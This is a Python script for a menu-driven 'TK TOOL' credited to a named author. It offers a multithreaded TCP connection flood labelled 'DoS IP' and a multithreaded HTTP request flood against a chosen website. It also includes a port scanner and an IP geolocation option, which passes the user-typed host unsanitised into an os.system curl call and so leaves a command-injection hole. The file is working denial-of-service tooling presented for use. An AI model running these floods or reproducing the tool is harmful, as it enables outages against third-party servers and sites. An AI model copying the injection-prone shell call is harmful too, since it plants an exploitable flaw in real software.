#!/usr/bin/env python3
import socket
import os
import requests
import time
import string
import random
import threading

""" --- Made by Theo Kershaw --- """

class Colours():
	red = "\033[31m"
	blue = "\033[34m"
	green = "\033[32m"
	white = "\033[37m"

def MainBanner():
	os.system('cls' if os.name == 'nt' else 'clear')
	os.system("mode con: cols=101 lines=40" if os.name == 'nt' else "printf '\e[8;39;101t'")
	print(f'''
{Colours.red}			████████╗██╗  ██╗  ████████╗ ██████╗  ██████╗ ██╗     
{Colours.blue}			╚══██╔══╝██║ ██╔╝  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
{Colours.red}			   ██║   █████╔╝█████╗██║   ██║   ██║██║   ██║██║     
{Colours.blue}			   ██║   ██╔═██╗╚════╝██║   ██║   ██║██║   ██║██║     
{Colours.red}			   ██║   ██║  ██╗     ██║   ╚██████╔╝╚██████╔╝███████╗
{Colours.blue}			   ╚═╝   ╚═╝  ╚═╝     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
{Colours.green}					-- Theo Kershaw -- 

		''')
	print(f'''
{Colours.blue}			[{Colours.white}01{Colours.blue}] {Colours.red}DoS IP
{Colours.blue}			[{Colours.white}02{Colours.blue}] {Colours.red}IP Port Scanner
{Colours.blue}			[{Colours.white}03{Colours.blue}] {Colours.red}Flood Requests (Website)
{Colours.blue}			[{Colours.white}04{Colours.blue}] {Colours.red}IP GeoLocate (Simple)
{Colours.blue}			[{Colours.white}99{Colours.blue}] {Colours.red}Exit {Colours.green}:(
		''')

def DoS_IP():
	os.system('cls' if os.name == 'nt' else 'clear')
	os.system("mode con: cols=101 lines=40" if os.name == 'nt' else "printf '\e[8;39;101t'")
	print(f'''
{Colours.red}				██████╗  ██████╗ ███████╗    ██╗██████╗ 
{Colours.blue}				██╔══██╗██╔═══██╗██╔════╝    ██║██╔══██╗
{Colours.red}				██║  ██║██║   ██║███████╗    ██║██████╔╝
{Colours.blue}				██║  ██║██║   ██║╚════██║    ██║██╔═══╝ 
{Colours.red}				██████╔╝╚██████╔╝███████║    ██║██║     
{Colours.blue}				╚═════╝  ╚═════╝ ╚══════╝    ╚═╝╚═╝     
{Colours.green}					-- Theo Kershaw --
		''')

	host = input(f'{Colours.blue}Enter IP {Colours.red}-> {Colours.white}')
	port = int(input(f'{Colours.blue}Enter Port {Colours.red}-> {Colours.white}'))
	max_threads = int(input(f'{Colours.blue}Enter Amount Of Threads {Colours.red}-> {Colours.white}'))

	def id_generator(size=12):
	    chars = string.ascii_letters + string.digits
	    return ''.join(random.choice(chars) for _ in range(size))

	def attack_ip():
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				msg = id_generator()
				s.send(msg.encode())
				print(f"{Colours.green}[{Colours.white}+{Colours.green}] {Colours.white}Sent{Colours.blue}: {Colours.red}{msg}")
				s.close()
			except ConnectionError:
				print(f"{Colours.red}[{Colours.white}-{Colours.red}] {Colours.white}Connection Error{Colours.red}...")
			except ConnectionRefusedError:
				print(f"{Colours.red}[{Colours.white}-{Colours.red}] {Colours.white}Unable To Reach Host{Colours.red}...")

	threads = []
	for _ in range(max_threads):
		thread = threading.Thread(target=attack_ip)
		threads.append(thread)
		thread.start()

	for thread in threads:
		thread.join()

def PortScanner():
	os.system('cls' if os.name == 'nt' else 'clear')
	os.system("mode con: cols=101 lines=40" if os.name == 'nt' else "printf '\e[8;39;101t'")
	print(f'''
{Colours.red}			   ██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗
{Colours.blue}			   ██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
{Colours.red}			   ██████╔╝███████╗██║     ███████║██╔██╗ ██║
{Colours.blue}			   ██╔═══╝ ╚════██║██║     ██╔══██║██║╚██╗██║
{Colours.red}			   ██║     ███████║╚██████╗██║  ██║██║ ╚████║
{Colours.blue}			   ╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{Colours.green}                 		   -- Theo Kershaw --                         
		''')

	host = input(f'{Colours.blue}Enter IP {Colours.red}->{Colours.white} ')
	start_port = int(input(f'{Colours.blue}Enter Start Port {Colours.red}-> {Colours.white}'))
	end_port = int(input(f'{Colours.blue}Enter End Port {Colours.red}-> {Colours.white}'))

	def ScanPorts():
		print(f'\n{Colours.green}[{Colours.white}+{Colours.green}] {Colours.white}Scanning{Colours.blue}: {Colours.red}{host} {Colours.white}Range{Colours.blue}: {Colours.red}{start_port}{Colours.white}-{Colours.red}{end_port}{Colours.green}...\n')
		for port in range(start_port, end_port + 1):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(1)
			result = s.connect_ex((host, port))
			if result == 0:
				print(f'{Colours.green}[{Colours.white}+{Colours.green}]{Colours.white} Port{Colours.blue}:{Colours.red} {port}{Colours.white} Is Open\n')
				input(f'{Colours.green}[{Colours.white}+{Colours.green}]{Colours.white} Press Enter To Coninue{Colours.green}...')
			s.close()

	ScanPorts()

def Flood_Requests():
	os.system('cls' if os.name == 'nt' else 'clear')
	os.system("mode con: cols=101 lines=40" if os.name == 'nt' else "printf '\e[8;39;101t'")
	print(f'''
{Colours.red}					███████╗    ██████╗ 
{Colours.blue}					██╔════╝    ██╔══██╗
{Colours.red}					█████╗█████╗██████╔╝
{Colours.blue}					██╔══╝╚════╝██╔══██╗
{Colours.red}					██║         ██║  ██║
{Colours.blue}					╚═╝         ╚═╝  ╚═╝
{Colours.green}					 -- Theo Kershaw --
                    
		''')

	target = input(f'{Colours.blue}Enter Target (https://exmaple.com) {Colours.red}-> {Colours.white}')
	max_threads = int(input(f'{Colours.blue}Enter Amount Of Threads {Colours.red}-> {Colours.white}'))

	def attack_site():
		while True:
			r = requests.get(target)
			print(f'{Colours.green}[{Colours.white}+{Colours.green}] {Colours.white}Sent{Colours.blue}: {Colours.red}{max_threads} {Colours.white}To{Colours.blue}: {Colours.red}{target}{Colours.green}...')

	threads = []
	for _ in range(max_threads):
		thread = threading.Thread(target=attack_site)
		threads.append(thread)
		thread.start()

def GeoTK():
	os.system('cls' if os.name == 'nt' else 'clear')
	os.system("mode con: cols=101 lines=40" if os.name == 'nt' else "printf '\e[8;39;101t'")
	print(f'''
{Colours.red}				 ██████╗ ███████╗ ██████╗ ████████╗██╗  ██╗
{Colours.blue}				██╔════╝ ██╔════╝██╔═══██╗╚══██╔══╝██║ ██╔╝
{Colours.red}				██║  ███╗█████╗  ██║   ██║   ██║   █████╔╝ 
{Colours.blue}				██║   ██║██╔══╝  ██║   ██║   ██║   ██╔═██╗ 
{Colours.red}				╚██████╔╝███████╗╚██████╔╝   ██║   ██║  ██╗
{Colours.blue}				 ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
{Colours.green}					  -- Theo Kershaw --
		''')

	host = input(f'{Colours.blue}Enter IP {Colours.red}-> {Colours.white}')

	def Locate():
		os.system(f'\n\ncurl https://ipinfo.io/{host}/json')
		input(f'\n\n{Colours.green}[{Colours.white}+{Colours.green}]{Colours.white} Press Enter To Continue{Colours.green}...')

	Locate()

def Main():
	while True:
		MainBanner()

		choice = input(f'{Colours.blue}[{Colours.red}TK TOOL{Colours.blue}]{Colours.green} -> {Colours.white}')

		if choice == '1':
			DoS_IP()
		elif choice == '2':
			PortScanner()
		elif choice == '3':
			Flood_Requests()
		elif choice == '4':
			GeoTK()
		elif choice == '99':
			print(f'{Colours.red}[{Colours.white}-{Colours.red}] {Colours.white}GoOdByE{Colours.green}.{Colours.blue}.{Colours.red}.')
			time.sleep(1)
			break
		else:
			print(f'{Colours.red}[{Colours.white}-{Colours.red}] {Colours.white}Invalid Option{Colours.red}...')
			time.sleep(1)

if __name__ == "__main__":
	Main()




